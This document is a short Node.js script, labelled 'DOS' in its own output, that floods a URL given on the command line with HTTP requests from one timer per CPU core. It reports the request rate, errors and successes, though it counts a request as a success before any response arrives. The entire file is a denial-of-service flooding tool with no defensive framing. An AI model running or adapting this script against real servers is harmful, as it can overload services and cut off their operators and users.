const request = require('request');
const process = require('process');
const os = require('os')

var ip = process.argv[2];
var requests = process.argv[3];
var cpus = os.cpus();

var sent_requests = 0;
var errors = 0;
var success = 0;

cpus.forEach(function() {
    setInterval(function() {
        sent_requests = sent_requests + 1;

        if (sent_requests == requests) {
            var RequestsPerSecond = sent_requests / process.uptime();

            console.log(`[DOS](${sent_requests}) Finished sending all requests`);
            console.log(`[DOS] ${process.uptime()}s needed to send ${sent_requests} requests`);
            console.log(`[DOS] Successes: ${success}`);
            console.log(`[DOS] Errors: ${errors}`);
            console.log(`[DOS] ${Math.round(RequestsPerSecond)} requests per second`);
            process.exit();
        } else {
            request(`${ip}`, function (error) {
                if (error) {
                    console.log(`[DOS] An error occured at request (${sent_requests})`);
                    errors = errors + 1;
                }
            })
            success = success + 1;
            console.log(`[DOS](${sent_requests}) Request sent succesfully`);
        }
    })
})